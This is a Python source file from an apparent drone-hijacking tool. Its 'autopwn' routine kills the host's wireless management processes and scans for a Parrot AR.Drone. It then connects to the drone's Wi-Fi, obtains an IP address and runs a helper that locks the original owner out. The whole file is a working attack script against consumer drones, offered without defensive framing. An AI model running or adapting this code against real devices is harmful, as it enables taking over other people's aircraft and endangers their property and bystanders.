import os, signal, sys, platform
from command.scancommand import find_drone
from command.manualflightcommand import ManualFlightcommand
from command.blockotherscommand import blockothers
from lib.pyiw import WirelessInterface
from lib.libardrone import ARDrone
from termcolor import colored

info_str = colored("[*] ", "blue")
succ_str = colored("[+] ", "green")

def pwn(interface):
    print info_str + "starting autopwn on interface %s" % interface
    
    # kill other interfering processes 
    if "arm" in platform.machine().lower():
        os.system("killall wpa_supplicant")
    else:
        os.system("airmon-ng check kill")

    print info_str+"searching for drone..."
    iface = WirelessInterface(interface)
    drone = find_drone(iface, False)
    print succ_str+"drone \"%s\" found" % drone

    print info_str+"connecting..."
    iface.connect(drone)
    print succ_str+"connection succeeded"

    iface.wait_for_ip()
    print succ_str+"ip address acquired"

    print info_str+"blocking original owner"
    blockothers(interface, False)
    print succ_str+"owner locked out"
    
